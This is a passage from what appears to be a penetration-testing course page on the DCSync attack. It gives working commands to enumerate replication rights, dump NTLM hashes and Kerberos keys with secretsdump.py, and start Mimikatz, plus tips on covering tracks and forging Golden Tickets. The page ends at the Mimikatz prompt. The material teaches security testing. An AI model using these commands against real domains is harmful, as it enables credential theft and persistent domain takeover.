## What is DCSync and How Does it Work?

DCSync is a technique for stealing the Active Directory password database by using the built-in `Directory Replication Service Remote Protocol`, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes.

The crux of the attack is requesting a Domain Controller to replicate passwords via the `DS-Replication-Get-Changes-All` extended right. This is an extended access control right within AD, which allows for the replication of secret data.

To perform this attack, you must have control over an account that has the rights to perform domain replication (a user with the Replicating Directory Changes and Replicating Directory Changes All permissions set). Domain/Enterprise Admins and default domain administrators have this right by default.

#### Using Get-DomainUser to View adunn's Group Membership

```powershell
Get-DomainUser -Identity adunn |select samaccountname,objectsid,memberof,useraccountcontrol |fl
```

#### Using Get-ObjectAcl to Check adunn's Replication Rights

```powershell
$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"

Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```
 
 We first get the user's SID in the above command and then check all ACLs set on the domain object (`"DC=inlanefreight,DC=local"`) using [Get-ObjectAcl](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainObjectAcl/) to get the ACLs associated with the object. Here we search specifically for replication rights and check if our user `adunn` (denoted in the below command as `$sid`) possesses these rights.

*If we had certain rights over the user (such as [WriteDacl](https://bloodhound.specterops.io/resources/edges/write-dacl)), we could also add this privilege to a user under our control, execute the DCSync attack, and then remove the privileges to attempt to cover our tracks. DCSync replication can be performed using tools such as Mimikatz, Invoke-DCSync, and Impacket’s secretsdump.py. Let's see a few quick examples.*

#### Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py

Running the tool as below will write all hashes to files with the prefix `inlanefreight_hashes`. The `-just-dc` flag tells the tool to extract NTLM hashes and Kerberos keys from the NTDS file.

```powershell
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
```

- We can use the `-just-dc-ntlm` flag if we only want NTLM hashes or specify
- `-just-dc-user <USERNAME>` to only extract data for a specific user
- `-pwd-last-set` to see when each account's password was last changed
-  `-history` if we want to dump password history, which may be helpful for offline password cracking or as supplemental data on domain password strength metrics for our client
- The `-user-status` is another helpful flag to check and see if a user is disabled. We can dump the NTDS data with this flag and then filter out disabled users when providing our client with password cracking statistics to ensure that data such as:
	- Number and % of passwords cracked
	- top 10 passwords
	- Password length metrics
	- Password re-use

*If we check the files created using the `-just-dc` flag, we will see that there are three: one containing the NTLM hashes, one containing Kerberos keys, and one that would contain cleartext passwords from the NTDS for any accounts set with [reversible encryption](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) enabled.*

#### Viewing an Account with Reversible Encryption Password Storage Set

![Active Directory Users and Computers showing PROXYAGENT properties with account options and expiration settings.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/143/reverse_encrypt.png)

*When this option is set on a user account, it does not mean that the passwords are stored in cleartext. Instead, they are stored using RC4 encryption. The trick here is that the key needed to decrypt them is stored in the registry (the [Syskey](https://docs.microsoft.com/en-us/windows-server/security/kerberos/system-key-utility-technical-overview)) and can be extracted by a Domain Admin or equivalent. Tools such as `secretsdump.py` will decrypt any passwords stored using reversible encryption while dumping the NTDS file either as a Domain Admin or using an attack such as DCSync. If this setting is disabled on an account, a user will need to change their password for it to be stored using one-way encryption. Any passwords set on accounts with this setting enabled will be stored using reversible encryption until they are changed. We can enumerate this using the `Get-ADUser` cmdlet:*


#### Enumerating Further using Get-ADUser for reversible encryption 

```powershell
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
```

#### Checking for Reversible Encryption Option using Get-DomainUser

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

#### Using runas.exe

```powershell
C:\Windows\system32>runas /netonly /user:INLANEFREIGHT\adunn powershell
powershell Enter the password for INLANEFREIGHT\adunn: 
Attempting to start powershell as user "INLANEFREIGHT\adunn" ...
```

#### Performing the Attack with Mimikatz

We can perform the attack with Mimikatz as well. Using Mimikatz, we must target a specific user. Here we will target the built-in administrator account. We could also target the `krbtgt` account and use this to create a `Golden Ticket` for persistence

*Also it is important to note that Mimikatz must be ran in the context of the user who has DCSync privileges. We can utilize `runas.exe` to accomplish this:*

```powershell
PS C:\htb> .\mimikatz.exe
